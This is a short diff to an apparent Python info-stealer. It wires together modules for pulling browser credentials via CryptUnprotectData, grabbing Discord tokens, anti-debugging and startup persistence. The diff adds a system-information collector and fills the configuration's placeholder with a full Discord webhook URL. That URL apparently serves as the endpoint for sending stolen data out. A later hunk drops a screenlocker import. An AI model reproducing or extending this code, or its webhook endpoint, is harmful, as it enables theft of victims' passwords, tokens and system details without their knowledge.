@@ -16,6 +16,7 @@ from win32crypt import CryptUnprotectData
 from spy import Browsers
 from antidebug import AntiDebug
 from startup import Startup
+from sysinfo import SystemInfo
 
 
 
@@ -27,6 +28,7 @@ def main():
         Browsers,
         AntiDebug,
         Startup,
+        SystemInfo,
     ]
 
     for func in funcs:
@@ -41,11 +43,12 @@ def main():
                 print(f'Error in {func.__name__}: {e}')
                 
 __cooperconf__ = {
-    'webhook' : "webhookhere",
+    'webhook' : "https://discord.com/api/webhooks/1166018862752477275/SqYjBLaOZCjXsrvWI9TunYkFtZT1Ew2da0MtmFcwJjwGSQA4hUmGToHEPNbyih2oBSNa",
     'browsers' : True, 
     'discordtoken' : True,
     'antidebug' : True,
-    'startup' : True
+    'startup' : True,
+    'systeminfo': True
 }
 
 
@@ -429,4 +432,3 @@ class upload_tokens:
 
 if __name__ == '__main__':
     main()
-    import screenlocker
